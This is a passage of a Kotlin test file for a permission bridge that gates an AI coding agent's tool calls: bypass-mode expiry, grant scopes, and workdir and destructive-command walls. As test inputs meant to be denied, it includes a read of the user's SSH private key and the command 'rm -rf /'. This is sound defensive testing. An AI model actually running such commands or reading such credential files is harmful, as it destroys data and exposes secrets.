        assertTrue(rules.isEmpty(), "no session rule may form on a handoff shell ask")
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "git status") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isNotEmpty(), "the second command must re-ask — no task grant formed")
        scope.cancel()
    }

    @Test
    fun full_control_expiry_bites_the_next_tool_call_even_mid_turn() = runBlocking {
        // P1-6: the bypass authority is read per decision, never cached at construction
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        var live = PermissionMode.BYPASS_PERMISSIONS
        val emitted = mutableListOf<Frame>()
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            currentMode = { live })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "ls") }))
        assertTrue(responses.single().allow, "before expiry: bypass auto-allows")
        live = PermissionMode.DEFAULT // the 1h expiry (or a user switch) flipped the daemon's live mode
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "ls") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().any { it.askId == "r2" },
            "after expiry the SAME turn's next tool call must ask")
        scope.cancel()
    }

    @Test
    fun owner_approved_bridge_request_no_longer_unlocks_walls() = runBlocking {
        // P1-8: request-level approval sits BEHIND the workdir wall and the destructive-Bash red line
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.OWNER_APPROVED },
            workdir = System.getProperty("java.io.tmpdir"))

        val home = System.getProperty("user.home")
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Read", buildJsonObject { put("file_path", "$home/.ssh/id_rsa") }))
        assertFalse(responses.single().allow, "approving a prompt is not a licence for path escapes")
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertFalse(responses.last().allow, "…nor for destructive Bash")
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isEmpty(), "walls deny outright — no card")
        // in-scope ordinary work still rides the request approval with no piecemeal card
        b.onControlRequest(AgentEvent.ControlRequest("r3", "Write", buildJsonObject { put("file_path", "notes.md") }))
        assertTrue(responses.last().allow)
        scope.cancel()
    }

    @Test
    fun unoffered_scope_on_a_normal_ask_clamps_to_allow_once() = runBlocking {
        // P1-2 general form: scope ∈ grantOptions is validated for EVERY ask, not only handoff
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val grants = dev.ccpocket.daemon.approval.ApprovalGrantStore()
        val emitted = mutableListOf<Frame>()
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            grants = grants, taskId = { "t1" },
            workdir = java.nio.file.Files.createTempDirectory("ccp-scope-wd").toFile().canonicalPath)
        b.onControlRequest(AgentEvent.ControlRequest("p1", "ExitPlanMode", buildJsonObject { put("plan", "step") }))
        val ask = emitted.filterIsInstance<PermissionAsk>().single()
        assertEquals(listOf("once"), ask.grantOptions) // a plan approval is one-off
        coord.onVerdict(PermissionVerdict("c1", "p1", Decision.ALLOW, grantScope = "task"))
        assertTrue(responses.single().allow)
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("p2", "ExitPlanMode", buildJsonObject { put("plan", "step2") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isNotEmpty(), "no grant formed from the unoffered scope")
        scope.cancel()
    }
}
